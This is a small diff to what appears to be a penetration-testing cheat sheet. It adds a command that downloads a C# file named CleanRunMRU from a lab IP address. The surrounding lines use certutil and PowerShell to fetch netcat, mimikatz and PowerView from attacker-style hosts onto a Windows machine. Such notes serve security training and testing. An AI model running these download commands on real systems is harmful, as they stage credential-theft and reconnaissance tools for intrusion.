@@ -410,6 +410,9 @@ certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
 # Download a File Using Certutil 
 certutil.exe -urlcache -f http://10.10.15.8:8000/mimikatz.exe mimikatz.exe
 
+# Download a File Using wget 
+wget -Uri http://10.10.14.207/CleanRunMRU/CleanRunMRU/Program.cs -OutFile CleanRunMRU.cs
+
 # Download a file with PowerShell with Synchronous 
 (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
